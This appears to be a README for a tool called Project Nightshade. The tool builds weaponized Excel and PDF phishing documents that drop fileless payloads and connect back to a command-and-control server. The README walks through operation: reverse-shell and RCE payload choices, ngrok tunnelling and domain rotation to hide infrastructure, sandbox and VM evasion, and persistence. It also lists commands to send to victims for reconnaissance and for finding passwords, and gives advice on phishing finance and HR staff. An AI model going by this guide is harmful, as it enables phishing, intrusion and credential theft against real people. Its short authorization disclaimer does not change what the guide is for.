# Project Nightshade - Advanced Document Dropper & C2 System

**Author:** ek0ms savi0r  
**A sophisticated penetration testing framework for authorized security research only.**

## Overview

Project Nightshade is an advanced Document dropper system with integrated Command & Control (C2) capabilities. It creates weaponized Excel and PDF files that deploy in-memory, fileless payloads with multiple persistence mechanisms and encrypted communications.

## Features

- **Multiple Document Types**: Excel (.xlsx) and PDF (.pdf) document support
- **Multiple Payload Options**: Reverse Shell, RCE, Full C2 Agent
- **OPSEC-Focused**: Domain rotation, ngrok tunneling, anti-analysis checks
- **Encrypted Communications**: AES-256 encrypted C2 channels
- **Persistence**: Multiple persistence mechanisms (scheduled tasks, registry, WMI)
- **Stealth**: Fileless execution, memory-only payloads
- **Flexible Delivery**: Ngrok, domain rotation, or custom domains
- **Adaptive Payloads**: Different techniques for Excel vs PDF exploitation

## Installation

### 1. Clone the Repository

```bash
git clone https://github.com/ekomsSavior/project_nightshade.git
cd project_nightshade
```

### 2. Install Dependencies

```bash
sudo apt update
pip3 install pycryptodome requests flask --break-system-packages
```

### 3. Install ngrok (for tunneling)

```bash 
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-v3-stable-linux-amd64.tgz
tar -xzf ngrok-v3-stable-linux-amd64.tgz
sudo mv ngrok /usr/local/bin/
```

### 4. Authenticate Ngrok

```bash
ngrok config add-authtoken YOUR_AUTHTOKEN_HERE
```

## Usage Guide

### Step 1: Start the C2 Server

```bash
# Start the Nightshade C2 server
python3 nightshade_staging.py

# Server will start on http://127.0.0.1:8080
# Reverse shell handler starts on port 4444
```

### Step 2: OPEN SECOND TERMINAL & Generate the Dropper

```bash
# Run the interactive dropper generator
cd project_nightshade
python3 nightshade_dropper.py
```

### Step 3: Follow the Interactive Prompts

**Document Type Selection:**
- Automatically detects based on filename extension (.xlsx or .pdf)
- Or specify manually by choosing appropriate filename

**Payload Selection:**
- `1` - Reverse Shell (connects to C2 on port 4444)
- `2` - RCE + Persistence (uses HTTP C2 endpoints)
- `3` - Full C2 Agent (advanced features)

## C2 Configuration:

**For Reverse Shell:**
- If using direct connection: Use your server IP and port 4444
- If using ngrok: Use the ngrok tunnel URL (no port needed)

**For RCE/Full C2:**
- If using direct connection: Use your server IP and port 8080  
- If using ngrok: Use the ngrok tunnel URL (no port needed)

### Ngrok Setup Example:
```bash
# Start ngrok tunnel for C2 server
ngrok http 8080

# Ngrok will provide a URL like: https://abc123-def4-567.ngrok-free.app
# Use this URL in your dropper configuration instead of your IP
```

### Configuration Examples:

**Direct Connection (No Ngrok):**
```
C2 Server: http://192.168.1.100:8080
Reverse Shell: 192.168.1.100:4444
```

**Ngrok Tunneling (Recommended for OPSEC):**
```
C2 Server: https://abc123-def4-567.ngrok-free.app
Reverse Shell: abc123-def4-567.ngrok-free.app:4444
```

**Important**: When using ngrok, you don't need to specify ports for HTTP/HTTPS traffic, but you DO need to specify the port for reverse shell connections (ngrok exposes TCP ports differently).
```


**Delivery Method:**
- `1` - Ngrok tunneling (recommended)
- `2` - Domain rotation
- `3` - Custom domain

## Document Types & Capabilities

### Excel Documents (.xlsx)
- **Technique**: OLE Template Injection
- **Trigger**: Document opening + "Enable Content"
- **Detection**: Microsoft Excel User-Agent
- **Persistence**: Excel-specific startup scripts
- **Advantages**: Higher success rate in corporate environments

### PDF Documents (.pdf)
- **Technique**: JavaScript payload execution
- **Trigger**: Document opening (auto-executes)
- **Detection**: Adobe Reader User-Agent
- **Persistence**: Reader-specific update mechanisms
- **Advantages**: No "Enable Content" prompt needed

### Multi-Technique Approach
The C2 server automatically detects the client type (Excel vs PDF Reader) and serves appropriate payloads with:
- Different persistence mechanisms
- Different download techniques
- Application-specific OPSEC measures

## C2 Operations

### After Successful Execution:

#### For Reverse Shell Payload:

```bash
# The C2 server automatically handles reverse shell connections
# You'll see connections in the C2 server console

# Available endpoints for monitoring:
curl http://127.0.0.1:8080/c2/sessions
```

#### For RCE/Full C2 Payload:

```bash
# View active sessions
curl http://127.0.0.1:8080/c2/sessions

# Send commands to a session
curl -X POST http://127.0.0.1:8080/c2/command \
  -H "Content-Type: application/json" \
  -d '{"session_id": "SESSION_ID_HERE", "command": "whoami"}'

# View server statistics (includes document type breakdown)
curl http://127.0.0.1:8080/admin/stats
```

### Example C2 Commands:

```bash
# System information
systeminfo
whoami /all

# Network reconnaissance
ipconfig /all
netstat -ano

# Lateral movement
net view
net user

# Data collection
dir C:\\Users\\ /s | findstr "password|secret|key"
```

## OPSEC Considerations

### Document-Specific OPSEC:

**Excel Documents:**
- Uses financial-themed templates
- Realistic spreadsheet content
- Professional formatting
- Microsoft-consistent User-Agents

**PDF Documents:**
- Employee confidentiality agreements
- Professional document formatting
- Realistic form fields
- Adobe-consistent User-Agents

### Infrastructure OPSEC:

**Ngrok Tunneling:**
```bash
# Rotate tunnels regularly
ngrok http 8080 --region eu --subdomain your-custom-subdomain
# Use different regions for resilience
# Available regions: us, eu, au, ap, sa, jp, in
```

**Domain Rotation:**
- The system includes built-in domain rotation for both Excel and PDF
- Uses multiple benign-looking domains for template delivery
- Automatically cycles through domains for OPSEC

### Anti-Analysis Features:
- Sandbox detection
- VM detection
- Debugger detection
- Blacklisted process checking
- Application-specific evasion techniques

## Advanced Configuration

### Customizing C2 Server:

Edit `nightshade_c2_server.py` configuration:

```python
class StagingConfig:
    PORT = 8080
    HOST = '0.0.0.0'
    REVERSE_SHELL_PORT = 4444
    USE_NGROK = True
    ENCRYPTION_KEY = 'your-custom-encryption-key'
    
    # Excel-specific User-Agents
    EXCEL_USER_AGENTS = [
        'Microsoft Office Excel 2016',
        'Microsoft Excel 2019',
        # Add your custom User-Agents
    ]
```

### Customizing Payloads:

**Excel-specific payloads:** `create_excel_payload()` function  
**PDF-specific payloads:** `create_pdf_exploit_payload()` function

Each uses different:
- Persistence mechanisms
- Download techniques
- Execution methods
- OPSEC measures

## Deployment Scenarios

### Corporate Phishing:
- Use Excel documents for financial departments
- Use PDF documents for HR/legal departments
- Tailor content to target audience

### Red Team Operations:
- Mix document types to avoid pattern detection
- Rotate delivery methods
- Use geographic-specific domains

### Security Testing:
- Test both Office and PDF reader security policies
- Evaluate different execution techniques
- Measure detection rates for each document type

## Legal & Ethical Notice

**FOR AUTHORIZED SECURITY RESEARCH ONLY**

**This tool is intended for:**
- Penetration testing with explicit permission
- Security research in controlled environments
- Educational purposes in ethical hacking courses

**Do NOT use for:**
- Unauthorized testing
- Malicious activities
- Any illegal purposes

ek0ms savi0r assumes no liability and is not responsible for any misuse or damage caused by this program.

## Troubleshooting

### Common Issues:

**Excel file not loading template:**
- Check if C2 server is running
- Verify network connectivity
- Check firewall settings

**PDF not executing JavaScript:**
- Ensure target has JavaScript enabled in PDF reader
- Test with different Adobe Reader versions
- Check C2 logs for User-Agent detection

**General troubleshooting:**
- Check C2 server logs for request details
- Verify ngrok tunnel is active (if using)
- Test with different document types

## Pro Tips

1. **Use Both Document Types**: Mix Excel and PDF for better coverage
2. **Tailor to Target**: Use Excel for finance teams, PDF for HR/legal
3. **Monitor C2 Dashboard**: Check `/admin/stats` for document type breakdown
4. **Rotate Techniques**: Use different payloads for each document type
5. **Test Detection Rates**: Evaluate which document type has lower detection
6. **Region-Specific Delivery**: Use local domains for geographic targeting

---

## DISCLAIMER: 

Always operate within legal boundaries and with proper authorization. This tool is powerful and should be used responsibly by security professionals.

**ek0ms savi0r**
